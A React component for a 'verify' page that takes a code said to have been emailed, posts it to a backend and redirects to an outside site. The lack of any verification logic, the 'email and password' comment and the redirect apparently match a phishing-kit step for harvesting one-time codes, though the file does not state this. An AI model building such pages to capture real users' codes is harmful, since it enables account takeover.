import { useState } from "react";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import BASE_URL from "../components/urls";
import "../styles/verify.css";
import logo from "../assets/logo.png";
import FormErrMsg from "../components/FormErrMsg";

// Validation schema for verify
const schema = yup.object().shape({
  verify: yup.string().required("verify is required"),
});

const Verify = () => {
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });
  const [loading, setLoading] = useState(false);

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/verify`, data) // Send email and password
      .then((response) => {
        console.log(response.data);
        window.location.href = "https://boltdrop.com/";
        reset(); // Reset
      })
      .catch((error) => {
        console.error("Error:", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="password-container">
      <div className="header">
        <div className="logo">
          <img src={logo} alt="" />
        </div>
        <h1>Enter Verification Code</h1>
        <span>
          A verification code has been sent to your email. Please enter the code
          below.
        </span>
      </div>

      <form className="password-form" onSubmit={handleSubmit(submitForm)}>
        <div className="input-container">
          <input
            type="text"
            id="password"
            {...register("verify")}
            required
            className="password-input"
          />
        </div>
        <FormErrMsg errors={errors} inputName="password" />

        <button type="submit" className="submit-btn">
          {loading ? "Loading..." : "Next"}
        </button>
      </form>
    </div>
  );
};

export default Verify;
